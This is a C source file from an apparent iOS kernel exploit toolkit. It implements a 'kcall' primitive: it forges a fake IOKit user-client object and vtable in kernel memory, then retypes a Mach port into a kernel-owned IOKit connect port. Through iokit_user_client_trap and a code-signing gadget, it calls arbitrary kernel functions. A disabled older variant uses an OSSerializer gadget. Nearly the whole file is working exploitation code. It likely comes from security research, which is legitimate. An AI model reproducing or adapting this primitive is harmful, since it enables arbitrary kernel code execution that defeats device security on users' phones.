#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>

#include "kcall.h"
#include "kmem.h"
#include "find_port.h"
#include "kutils.h"
#include "symbols.h"
#include "early_kalloc.h"



extern uint64_t
iokit_user_client_trap(
  mach_port_t connect,
  unsigned int index,
  uintptr_t p1,
  uintptr_t p2,
  uintptr_t p3,
  uintptr_t p4,
  uintptr_t p5,
  uintptr_t p6 );

#if 0
// OSSerializer::Serialize method
// lets you pass two uint64_t arguments
// no return value

// a simple IOKit mig method
extern void IOIteratorReset(mach_port_t port);

struct fake_iokit_obj {
  uint64_t vtable;
  uint64_t refcount;        // vtable +0x00
  uint64_t arg0;            // vtable +0x08
  uint64_t arg1;            // vtable +0x10
  uint64_t fptr;            // vtable +0x18
  uint64_t retain;          // vtable +0x20
  uint64_t release;         // vtable +0x28
  uint64_t ign;             // vtable +0x30
  uint64_t get_meta_class;  // vtable +0x38
};

// call fptr in the context of the current thread passing arg0 and arg1
// uses the serializer gadget
void kcall(uint64_t fptr, uint64_t arg0, uint64_t arg1) {
  // allocate some memory to hold a fake iokit object:
  uint64_t obj_kaddr = kmem_alloc(sizeof(struct fake_iokit_obj)+0x800);
  
  // fill in the fields:
  wk64(obj_kaddr+offsetof(struct fake_iokit_obj,         vtable), obj_kaddr+0x08); // point this to the next field
  wk64(obj_kaddr+offsetof(struct fake_iokit_obj,       refcount), 0x2017);
  wk64(obj_kaddr+offsetof(struct fake_iokit_obj,           arg0), arg0);
  wk64(obj_kaddr+offsetof(struct fake_iokit_obj,           arg1), arg1);
  wk64(obj_kaddr+offsetof(struct fake_iokit_obj,           fptr), fptr);
  wk64(obj_kaddr+offsetof(struct fake_iokit_obj,         retain), ksym(KSYMBOL_RET));
  wk64(obj_kaddr+offsetof(struct fake_iokit_obj,        release), ksym(KSYMBOL_OSSERIALIZER_SERIALIZE));
  wk64(obj_kaddr+offsetof(struct fake_iokit_obj,            ign), 0);
  wk64(obj_kaddr+offsetof(struct fake_iokit_obj, get_meta_class), ksym(KSYMBOL_OSARRAY_GET_META_CLASS));
  for (int i = 1; i < 0xff; i++) {
    wk64(obj_kaddr+offsetof(struct fake_iokit_obj, get_meta_class) + (i*8), 0x1010101010101000+(i*4));
  }
  
  // allocate a port
  mach_port_t port = MACH_PORT_NULL;
  kern_return_t err;
  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
  if (err != KERN_SUCCESS) {
    printf("failed to allocate port\n");
    return;
  }
  
  // get a send right
  mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
  
  // locate the port
  uint64_t port_addr = find_port_address(port, MACH_MSG_TYPE_COPY_SEND);
  
  // change the type of the port
  #define IKOT_IOKIT_OBJECT 30
  #define IO_ACTIVE   0x80000000
  wk32(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_ACTIVE|IKOT_IOKIT_OBJECT);
  
  // cache the current space:
  uint64_t original_space = rk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
  
  // change the space of the port
  wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), ipc_space_kernel());
  
  // set the kobject
  wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), obj_kaddr);
  
  // call an iokit method
  IOIteratorReset(port);
  
  // clear the kobject
  wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), 0);
  
  // reset the space
  wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), original_space);
  
  // reset the type
  #define IKOT_NONE 0
  wk32(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_ACTIVE|IKOT_NONE);
  
  // release the port
  mach_port_destroy(mach_task_self(), port);
  
  // free the fake object
  kmem_free(obj_kaddr, sizeof(struct fake_iokit_obj)+0x800);
}

void test_kcall() {
  uint64_t test_buf = kmem_alloc(0x20);
  wk64(test_buf, 0x4141414141414141);
  wk64(test_buf+8, 0);
  kcall(ksym(KSYMBOL_UUID_COPY), test_buf+8, test_buf);
  uint64_t read_val = rk64(test_buf+8);
  printf("read_val: %llx\n", read_val);
  kmem_free(test_buf, 0x20);
}
#endif

/*
 __TEXT_EXEC:__text:FFFFFFF0073EB130 _csblob_get_cdhash                      ; DATA XREF: com.apple.driver.AppleMobileFileIntegrity:__got:AppleMobileFileIntegrity_GOT__csblob_get_cdhasho
 __TEXT_EXEC:__text:FFFFFFF0073EB130                                         ; com.apple.security.sandbox:__got:sandbox_GOT__csblob_get_cdhasho
 __TEXT_EXEC:__text:FFFFFFF0073EB130                 ADD             X0, X0, #0x40
 __TEXT_EXEC:__text:FFFFFFF0073EB134                 RET
 */

mach_port_t arbitrary_call_port = MACH_PORT_NULL;
uint64_t obj_kaddr = 0;

// the iokit_user_client_trap method.
// this lets you pass up to 7 uint64_t arguments
// the return value will be truncated to 32-bits
// see arm_set_mach_syscall_ret for why:
// static void
// arm_set_mach_syscall_ret(struct arm_saved_state *state, int retval)
// {
//   if (is_saved_state32(state)) {
//     saved_state32(state)->r[0] = retval;
//   } else {
//     saved_state64(state)->x[0] = retval;
//   }
// }
// that compiles to:
//   STR             W20, [X19,#8] <-- 32-bit store

uint64_t kcall(uint64_t fptr, uint32_t argc, ...) {
  uint64_t args[7] = {0};
  va_list ap;
  va_start(ap, argc);
  
  if (argc > 7) {
    printf("too many arguments to kcall\n");
    return 0;
  }
  
  for (int i = 0; i < argc; i++){
    args[i] = va_arg(ap, uint64_t);
  }
  
  va_end(ap);
  
  if (arbitrary_call_port == MACH_PORT_NULL) {
    // build the object:
    // allocate some memory to hold a fake iokit object:
    obj_kaddr = early_kalloc(0x1000);
    printf("kcall object allocated via early_kalloc at %llx\n", obj_kaddr);
    
    // fill in the fields:
    wk64(obj_kaddr + 0, obj_kaddr+0x800); // vtable pointer
    
    // IOExternalTrap
    wk64(obj_kaddr + 0x50, 0);       // the function pointer is actually a pointer-to-member-method, so needs a 0 here too
                                     // see this old bug where I discuss pointer-to-member-methods:
                                     // https://bugs.chromium.org/p/project-zero/issues/detail?id=20
    
    wk32(obj_kaddr + 0x9c, 0x1234); // __ipc
    
    // vtable:
    wk64(obj_kaddr + 0x800 + 0x20,  ksym(KSYMBOL_RET)); // vtable::retain
    wk64(obj_kaddr + 0x800 + 0x28,  ksym(KSYMBOL_RET)); // vtable::release
    wk64(obj_kaddr + 0x800 + 0x38,  ksym(KSYMBOL_IOUSERCLIENT_GET_META_CLASS)); // vtable::getMetaClass
    wk64(obj_kaddr + 0x800 + 0x5b8, ksym(KSYMBOL_CSBLOB_GET_CD_HASH)); // vtable::getExternalTrapForIndex
    wk64(obj_kaddr + 0x800 + 0x5c0, ksym(KSYMBOL_IOUSERCLIENT_GET_TARGET_AND_TRAP_FOR_INDEX));
    
    // allocate a port
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &arbitrary_call_port);
    if (err != KERN_SUCCESS) {
      printf("failed to allocate port\n");
      return 0;
    }
    
    // get a send right
    mach_port_insert_right(mach_task_self(), arbitrary_call_port, arbitrary_call_port, MACH_MSG_TYPE_MAKE_SEND);
    
    // locate the port
    uint64_t port_addr = find_port_address(arbitrary_call_port, MACH_MSG_TYPE_COPY_SEND);
    
    // change the type of the port
#define IKOT_IOKIT_CONNECT 29
#define IO_ACTIVE   0x80000000
    wk32(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_ACTIVE|IKOT_IOKIT_CONNECT);
    
    // cache the current space:
    //uint64_t original_space = rk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
    
    // change the space of the port
    wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), ipc_space_kernel());
    
    // set the kobject
    wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), obj_kaddr);
  }
  
  // put arg0 and the function pointer in the right place
  wk64(obj_kaddr + 0x40, args[0]);
  wk64(obj_kaddr + 0x48, fptr);
  
  // call the external trap:
  uint64_t return_val = iokit_user_client_trap(arbitrary_call_port, 0,
                                               args[1],
                                               args[2],
                                               args[3],
                                               args[4],
                                               args[5],
                                               args[6]);
  
  printf("return val %llx\n", return_val);
  
#if 0
  // clear the kobject
  wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), 0);
  
  // reset the space
  wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), original_space);
  
  // reset the type
#define IKOT_NONE 0
  wk32(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_ACTIVE|IKOT_NONE);
  
  // release the port
  mach_port_destroy(mach_task_self(), port);
#endif

  return return_val;
}













